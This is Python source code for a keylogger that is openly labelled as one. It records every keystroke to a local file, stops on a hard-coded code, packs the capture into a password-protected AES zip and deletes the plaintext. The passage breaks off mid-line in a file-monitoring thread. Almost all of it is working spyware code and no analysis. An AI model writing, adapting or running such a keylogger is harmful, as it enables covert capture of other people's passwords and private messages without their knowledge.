# Keylogger Program
# Author: KPFZIPOH
# Description: A keylogger that captures keystrokes, saves them to a file, and archives them in a password-protected zip file.
#              The program stops when the stop code "999123123999" is detected. It includes file monitoring and logging.

import os
import time
import threading
import pyzipper
import datetime
import logging
from pynput import keyboard

# Configuration dictionary for easy customization
CONFIG = {
    "output_file": "keys.txt",
    "stop_code": "999123123999",
    "zip_password": b"999123123999",
    "log_file": "keylogger.log",
    "monitor_interval": 1  # Seconds between file checks
}

# Setup logging to track program activity and errors
logging.basicConfig(
    filename=CONFIG["log_file"],
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Initialize variable to track entered keys
entered_keys = ""

# Create output file for keystrokes with start timestamp
def initialize_output_file():
    """Initialize the keystroke output file with a start timestamp."""
    try:
        with open(CONFIG["output_file"], "w") as f:
            start_time = time.strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\nCapture started at {start_time}\n")
        logging.info(f"Keystroke capture started. Output file: {CONFIG['output_file']}")
    except Exception as e:
        logging.error(f"Failed to initialize output file: {str(e)}")

# Handle key press events and map special keys
def on_press(key):
    """Handle key press events, map special keys, and write to file."""
    global entered_keys
    try:
        # Map special keys to readable strings
        key_mappings = {
            keyboard.Key.enter: "\n",
            keyboard.Key.backspace: "<backspace>",
            keyboard.Key.delete: "<del>",
            keyboard.Key.ctrl_l: "<Ctrl>",
            keyboard.Key.ctrl_r: "<Ctrl>",
            keyboard.Key.alt_l: "<Alt>",
            keyboard.Key.alt_r: "<Alt>",
            keyboard.Key.esc: "<Esc>",
            keyboard.Key.space: "<Space>",
            keyboard.Key.tab: "<Tab>"
        }
        
        # Get the key representation
        key_str = key_mappings.get(key, key.char if hasattr(key, "char") else str(key))
        
        # Append key to global variable and write to file
        entered_keys += key_str
        with open(CONFIG["output_file"], "a") as f:
            f.write(key_str)
        
        logging.debug(f"Key captured: {key_str}")
        
        # Check for stop code
        if CONFIG["stop_code"] in entered_keys:
            logging.info("Stop code detected in entered keys.")
            stop_program()
            
    except AttributeError:
        logging.warning(f"Unhandled key: {key}")
    except Exception as e:
        logging.error(f"Error in on_press: {str(e)}")

# Stop the program and perform cleanup
def stop_program():
    """Stop the keylogger, archive the output file, and exit."""
    try:
        listener.stop()
        logging.info("Keyboard listener stopped.")
        
        # Write stop timestamp to file
        with open(CONFIG["output_file"], "a") as f:
            stop_time = time.strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\nCapture stopped at {stop_time}")
        
        # Create a password-protected zip file
        date_string = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        zip_filename = f"keys_{date_string}.zip"
        with pyzipper.AESZipFile(
            zip_filename,
            "w",
            compression=pyzipper.ZIP_LZMA,
            encryption=pyzipper.WZ_AES
        ) as zf:
            zf.setpassword(CONFIG["zip_password"])
            zf.write(CONFIG["output_file"])
        
        logging.info(f"Output file archived to {zip_filename}")
        
        # Remove the original file
        os.remove(CONFIG["output_file"])
        logging.info(f"Original output file {CONFIG['output_file']} deleted.")
        
        # Exit the program
        os._exit(0)
        
    except Exception as e:
        logging.error(f"Error during stop_program: {str(e)}")
        os._exit(1)

# Monitor the output file for the stop code
def monitor_keys_file():
    """Monitor the output file for the stop code in a separate thread."""
    while True:
        try:
            with open(CONFIG["output_file"], "r") as f:
                file_content = f.read()
                if CONFIG["stop_code"] in file_content.replace(" ", ""):
                    logging.info("Stop code detected in file content.")
                    stop
